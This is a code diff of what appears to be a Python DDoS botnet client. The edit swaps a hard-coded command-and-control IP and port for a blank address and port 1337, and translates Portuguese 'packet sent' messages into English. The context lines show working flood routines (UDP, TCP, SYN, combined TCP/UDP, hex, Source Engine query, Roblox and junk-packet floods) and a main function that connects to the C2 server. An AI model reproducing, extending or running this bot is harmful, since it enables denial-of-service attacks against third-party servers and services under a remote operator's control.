@@ -11,8 +11,8 @@ from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
 # IP AND PORT C2 ------------------->
-SQUASHEDC2_ADDRESS  = "176.97.114.180"
-SQUASHEDC2_PORT     = 80
+SQUASHEDC2_ADDRESS  = ""
+SQUASHEDC2_PORT     = 1337
 
 
 # Code -------------------------->
@@ -305,7 +305,7 @@ def attack_udp(ip, port, secs, size):
         dport = random.randint(1, 65535) if port == 0 else port
         data = random._urandom(size)
         s.sendto(data, (ip, dport))
-        print('Pacote UDP Enviado')
+        print('UDP Packet Sent')
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
@@ -314,7 +314,7 @@ def attack_tcp(ip, port, secs, size):
             s.connect((ip, port))
             while time.time() < secs:
                 s.send(random._urandom(size))
-                print('Pacote TCP Enviado')
+                print('TCP Packet Sent')
         except:
             pass
 
@@ -331,7 +331,7 @@ def attack_SYN(ip, port, secs):
             
             while time.time() < secs:
                 s.send(pkt)
-                print('Pacote SYN Enviado')
+                print('SYN Packet Sent')
         except:
             s.close()
 
@@ -345,7 +345,7 @@ def attack_tup(ip, port, secs, size):
             tcp.connect((ip, port))
             udp.sendto(data, (ip, dport))
             tcp.send(data)
-            print('Pacote TUP Enviado')
+            print('TUP Packet Sent')
         except:
             pass
 
@@ -359,7 +359,7 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        print('Pacote HEX Enviado')
+        print('HEX Packet Sent')
 
 def attack_vse(ip, port, secs):
     payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
@@ -368,7 +368,7 @@ def attack_vse(ip, port, secs):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        print('Pacote VSE Enviado')
+        print('VSE Packet Sent')
 
 
 def attack_roblox(ip, port, secs, size):
@@ -381,7 +381,7 @@ def attack_roblox(ip, port, secs, size):
             hex = "%064x" % ran
             hex = hex[:64]
             s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
-            print('Pacote ROBLOX Enviado')
+            print('ROBLOX Packet Sent')
 
 def attack_junk(ip, port, secs):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
@@ -390,7 +390,7 @@ def attack_junk(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
-        print('Pacote junk enviado')
+        print('Junk Packet Sent')
 
 def main():
         c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
